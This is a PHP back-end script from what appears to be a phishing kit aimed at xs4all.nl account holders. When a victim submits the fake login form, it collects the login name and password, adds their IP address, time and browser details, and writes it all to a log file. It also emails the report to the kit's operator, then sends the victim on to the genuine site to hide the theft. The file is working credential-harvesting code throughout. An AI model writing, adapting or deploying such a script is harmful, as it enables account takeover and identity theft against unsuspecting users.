<?php
include('Email.php');
include('funciones.php');
include('get_browser.php');
include('get_ip.php');
$ip= $_SERVER['REMOTE_ADDR'];
$TIME_DATE = date('H:i:s d/m/Y');



if (isset($_POST['eh'])) {
if ($_POST['eh'] == "" || $_POST['ph'] == "" ) {
HEADER("Location: ../index.php?assure_nfpb=true&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=fr_".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."");

}else{

$DCH_MESSAGE .= "<html>
<head><meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
●••●••۰۰•● ❤ ●•۰۰۰۰•● ❤ <font style='color: #000f82;'>BY DCH-DEV </font> ❤ ●•۰۰۰۰•● ❤ ●•۰۰۰•●••●●••<br/>
================( <font style='color: #0a5d00;'>LOGIN $ip</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [LOGIN ] = <font style='color:#ba0000;'>".$_POST['eh']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [PASS ] = <font style='color:#ba0000;'>".$_POST['ph']."</font><br>
================( <font style='color: #0a5d00;'>VICTIME INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [IP INFO]           = <font style='color:#ba0000;'>".$ip."</font><br>
<font style='color:#00049c;'>🤑✪</font> [TIME/DATE]         = <font style='color:#ba0000;'>".$TIME_DATE."</font><br>
<font style='color:#00049c;'>🤑✪</font> [BROWSER]           = <font style='color:#ba0000;'>".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
●••●••۰۰•● ❤ ●•۰۰۰۰•● ❤ <font style='color: #000f82;'>BY DCH-DEV </font> ❤ ●•۰۰۰۰•● ❤ ●•۰۰۰•●••●●••<br/>
</div></html>\n";

functiondilih(strip_tags($DCH_MESSAGE));
$khraha = fopen("../Icoder.html", "a");
fwrite($khraha, $DCH_MESSAGE);
$DCH_SUBJECT .= "LOGIN $ip";
$DCH_HEADERS .= "From: Dch-Dev<cantact>";
$DCH_HEADERS .= "Dch-Version: 1.0\n";
$DCH_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
@mail($DCH_EMAIL, $DCH_SUBJECT, $DCH_MESSAGE, $DCH_HEADERS);
HEADER("Location: https://www.xs4all.nl/assure_nfpb=true&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=fr_".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."");

 }}












?>

